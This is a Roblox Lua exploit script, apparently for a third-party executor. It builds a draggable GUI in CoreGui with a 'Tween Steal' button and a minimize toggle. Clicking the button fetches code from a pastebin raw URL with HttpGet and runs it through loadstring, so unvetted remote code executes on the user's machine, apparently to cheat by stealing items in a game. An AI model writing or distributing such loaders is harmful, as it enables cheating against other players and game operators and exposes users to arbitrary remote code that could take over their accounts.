local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TweenStealButton = Instance.new("TextButton")
local MinimizeButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.35, 0, 0.35, 0)
MainFrame.Size = UDim2.new(0, 200, 0, 120)
MainFrame.Active = true
MainFrame.Draggable = true

TweenStealButton.Name = "TweenStealButton"
TweenStealButton.Parent = MainFrame
TweenStealButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TweenStealButton.Position = UDim2.new(0.1, 0, 0.4, 0)
TweenStealButton.Size = UDim2.new(0.8, 0, 0.3, 0)
TweenStealButton.Text = "Tween Steal"
TweenStealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TweenStealButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/7xJkR3Kw"))()
end)

MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Parent = MainFrame
MinimizeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
MinimizeButton.Position = UDim2.new(0.85, 0, 0, 0)
MinimizeButton.Size = UDim2.new(0.15, 0, 0.2, 0)
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local minimized = false

MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    for _, v in pairs(MainFrame:GetChildren()) do
        if v:IsA("TextButton") and v ~= MinimizeButton then
            v.Visible = not minimized
        end
    end
end)
